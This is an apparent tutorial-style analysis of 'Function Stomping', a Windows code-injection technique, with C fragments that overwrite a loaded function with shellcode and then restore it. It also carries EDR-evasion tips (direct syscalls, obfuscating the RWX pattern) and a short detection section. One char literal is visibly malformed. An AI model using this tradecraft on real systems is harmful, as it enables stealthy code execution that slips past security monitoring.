## Overview

Function Stomping is an advanced code-injection technique whose essence lies in directly modifying the code of an already-loaded function in memory, replacing it with a custom payload, executing it, and then restoring the original state. This approach circumvents the more conspicuous aspects of traditional injection techniques—such as allocating new memory or creating new threads—by leveraging legitimate locations within existing system modules to achieve stealthy execution.

Imagine you have a regular coffee shop with a habitual barista (a function). You know this barista starts making the first cup at 9 a.m. every day (function execution). Now suppose you surreptitiously replace that barista while keeping the workstation in the exact same spot (the function address). When other customers come at 9 a.m. and order coffee, they receive a cup made by the person you installed (your code executes), yet they remain entirely unaware of any change.

This thought experiment conveys the core of Function Stomping: **replace while preserving the original location**.

This document analyzes an implementation of Function Stomping in depth, focusing on its low-level principles and implementation details, including system call usage, memory management, and PE file structure.

## Core Implementation Principles

### System Call Evasion

On Windows, user-mode API calls ultimately cross into kernel mode via system call gates exposed by `ntdll.dll`. Security products (EDR/AV) commonly instrument or hook at the user-mode API layer; by invoking system calls directly, one can evade some of these user-mode monitoring hooks.

The code obtains a function pointer for `NtProtectVirtualMemory` using `GetProcAddress`:

```
typedef NTSTATUS(NTAPI* NtProtectVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect);

NtProtectVirtualMemory = (NtProtectVirtualMemory_t)GetProcAddress(
    GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory");
```

Key points here:

- `BaseAddress` is of type `PVOID*` because the syscall implementation may adjust alignment or otherwise update the supplied address value internally.
- `RegionSize` is `PSIZE_T` and may be modified to reflect the actual size of the memory region that was affected.
- The return value is an `NTSTATUS`; non-zero values indicate failure and must be properly handled.

### Memory Protection Semantics

Windows manages memory protection at a page granularity (typically 4 KB). Protection flags dictate access semantics. To write a payload into code pages, the code temporarily modifies page protections:

```
ULONG oldProtect;
NTSTATUS status = NtProtectVirtualMemory(
    GetCurrentProcess(),
    &address,        // pointer to the address
    &size,           // pointer to the size
    PAGE_EXECUTE_READWRITE,  // new protection: executable + readable + writable
    &oldProtect      // preserves previous protection
);
```

Meaning of common protection flags:

- `PAGE_NOACCESS` (0x01): no access
- `PAGE_READONLY` (0x02): read-only
- `PAGE_READWRITE` (0x04): read & write
- `PAGE_EXECUTE` (0x10): execute-only
- `PAGE_EXECUTE_READ` (0x20): execute & read
- `PAGE_EXECUTE_READWRITE` (0x40): execute & read & write

A pattern of `RX → RWX → RX` (read/execute → read/write/execute → read/execute) is suspicious and readily detected by security tooling. In practice, countermeasures such as introducing latency or obfuscation are employed to mitigate detection.

### PE Structure and Function Resolution

When the OS loads a DLL, it parses the PE structure, including the Export Table, to resolve exported functions. The code uses `GetProcAddress` to obtain a function address; under the hood this involves traversing the export table:

```c
// Simplified export table resolution logic
PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
IMAGE_DATA_DIRECTORY exportDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + exportDir.VirtualAddress);

DWORD* functions = (DWORD*)((BYTE*)hModule + exportDirectory->AddressOfFunctions);
DWORD* names = (DWORD*)((BYTE*)hModule + exportDirectory->AddressOfNames);
WORD* ordinals = (WORD*)((BYTE*)hModule + exportDirectory->AddressOfNameOrdinals);

for (DWORD i = 0; i < exportDirectory->NumberOfNames; i++) {
    LPCSTR funcName = (LPCSTR)((BYTE*)hModule + names[i]);
    if (strcmp(funcName, targetFunc) == 0) {
        FARPROC funcAddr = (FARPROC)((BYTE*)hModule + functions[ordinals[i]]);
        break;
    }
}
```

The export table contains mappings from names and ordinals to RVA addresses. `GetProcAddress` effectively searches this table to locate the desired function.

### Memory Layout Validation

Before modifying a function’s instructions, it is necessary to verify that the target memory region is appropriate for writing:

```
MEMORY_BASIC_INFORMATION mbi;
VirtualQuery(funcAddr, &mbi, sizeof(mbi));

// Check that the memory state is committed
if (mbi.State != MEM_COMMIT) {
    // Memory is not committed; not usable
}

// Compute available space: from function address to the end of the region
SIZE_T availableSpace = (SIZE_T)mbi.BaseAddress + mbi.RegionSize - (SIZE_T)funcAddr;
if (availableSpace < requiredSize) {
    // Not enough space; may overwrite adjacent functions
}
```

`VirtualQuery` reports information per page; thus bear in mind that payloads must not cross page boundaries in a way that overwrites unrelated data.

## Code Analysis

### Initialize Syscall Function

```
BOOL InitSyscallFunctions() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return FALSE;

    NtProtectVirtualMemory = (NtProtectVirtualMemory_t)GetProcAddress(ntdll, "NtProtectVirtualMemory");
    if (!NtProtectVirtualMemory) return FALSE;

    return TRUE;
}
```

This directly retrieves the `ntdll.dll` module handle without incrementing its reference count by avoiding `LoadLibrary`. `GetProcAddress` is then used to locate `NtProtectVirtualMemory`. The initialization is straightforward. In adversarial contexts, one may further avoid hardcoding the symbol name by parsing `ntdll.dll`’s export table, deriving the syscall number (SSN), and dynamically assembling a `syscall` instruction to invoke it—thereby evading hooks on `GetProcAddress` or explicit calls to `NtProtectVirtualMemory`. However, for instructional purposes, the present approach cleanly conveys the key idea.

### Securely Loading a DLL

```
HMODULE SecureLoadDll(LPCSTR dllName) {
    char dllPath[MAX_PATH];
    ZeroMemory(dllPath, MAX_PATH);

    UINT sysDirLen = GetSystemDirectoryA(dllPath, MAX_PATH);
    if (sysDirLen == 0 || sysDirLen > MAX_PATH - 10) return NULL;

    dllPath[sysDirLen] = '\';
    strncpy_s(dllPath + sysDirLen + 1, MAX_PATH - sysDirLen - 1, dllName, MAX_PATH - sysDirLen - 1);

    return LoadLibraryA(dllPath);
}
```

Loading the DLL from the system directory reduces the risk of DLL hijacking. `GetSystemDirectoryA` returns the system directory; the code concatenates the DLL filename and calls `LoadLibraryA`.

### Altering Memory Protection

```
BOOL SetMemoryProtection(LPVOID address, SIZE_T size, DWORD newProtect, PULONG oldProtect) {
    NTSTATUS status = NtProtectVirtualMemory(
        GetCurrentProcess(),
        &address,  // pointer to the address
        (PSIZE_T)&size,  // pointer to the size
        newProtect,
        oldProtect
    );
    return (status == 0);
}
```

This wrapper encapsulates the system call semantics. Note that both `address` and `size` are passed by pointer because the syscall may modify them.

### Suitability Check for Target Function

```
BOOL IsFuncSuitable(FARPROC funcAddr, SIZE_T requiredSize) {
    MEMORY_BASIC_INFORMATION mbi;
    if (VirtualQuery(funcAddr, &mbi, sizeof(mbi))) {
        if (mbi.State != MEM_COMMIT) return FALSE;
        SIZE_T availableSpace = (SIZE_T)mbi.BaseAddress + mbi.RegionSize - (SIZE_T)funcAddr;
        return (availableSpace >= requiredSize);
    }
    return FALSE;
}
```

This validates that the memory region is committed and that there is sufficient contiguous space to accommodate the required bytes. `mbi.RegionSize` represents the size of the whole region starting from `mbi.BaseAddress`.

### Payload Design

The payload must be position-independent code (PIC) because it will be executed at an arbitrary address. The document’s payload example launches the standard calculator shellcode. In practical cases, you would replace it with the desired functionality.

Payloads are typically authored in assembly and assembled to raw machine code. For instance, a minimalistic PIC snippet might look like:

```
start:
    call get_addr
get_addr:
    pop ebx
```

On x64, RIP-relative addressing simplifies PIC design.

### Execution Trigger

The code executes the payload by creating a thread:

```
HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pTargetFunc, NULL, 0, NULL);
if (hThread) {
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
}
```

A thread executes at the target function’s address. Alternatively, the function could be invoked directly, but that might corrupt the current thread’s stack; using a new thread isolates the execution context.

### Restoring Original State

After execution, restore the original instructions and page protections:

```
memcpy(pTargetFunc, originalBytes, payloadSize);  // restore original bytes
ULONG tempProtect;
SetMemoryProtection(pTargetFunc, payloadSize, oldProtect, &tempProtect);  // restore protection
```

When restoring, pass back the preserved `oldProtect`. `tempProtect` receives an output value that is typically not used further.

## Detection and Mitigation

From a defensive perspective, monitor for the following behaviors:

1. **Memory protection changes**: Observe calls to `NtProtectVirtualMemory`, particularly patterns that switch `RX → RWX → RX`.
2. **Code integrity checks**: Periodically verify code-page hashes of critical functions.
3. **Behavioral heuristics**: Detect rapid-write-and-restore patterns to functions, which may indicate malicious modifications.

For example, a simple function integrity check could be:

```
BOOL IsFunctionModified(FARPROC funcAddr, const BYTE* expectedCode, SIZE_T size) {
    for (SIZE_T i = 0; i < size; i++) {
        if (((BYTE*)funcAddr)[i] != expectedCode[i]) {
            return TRUE;
        }
    }
    return FALSE;
}
```

## Conclusion

Function Stomping is an efficient code-injection method that leverages existing function locations to execute arbitrary code stealthily. Key technical facets include:

- invoking system calls to bypass user-mode monitoring
- modifying page protections to allow code write
- parsing PE export tables to locate functions
- validating memory layout prior to writing
- designing position-independent payload code for reliable execution

Implementers must carefully handle syscall argument semantics, memory alignment, and robust error handling. From a defensive standpoint, monitoring for memory protection changes and enforcing code integrity checks are effective mitigation strategies.

A limitation of this approach—one that merits remediation in red-team contexts—is its relative lack of stealth against modern EDR: the use of `GetProcAddress`, a conspicuous `RX→RWX→RX` pattern, and static targeting of a specific function can be fairly straightforward to detect.

This technique nonetheless demonstrates a deep understanding of Windows internals: memory management, PE structure, and syscall mechanics. Mastery of these concepts is valuable for advanced Windows development and security research.
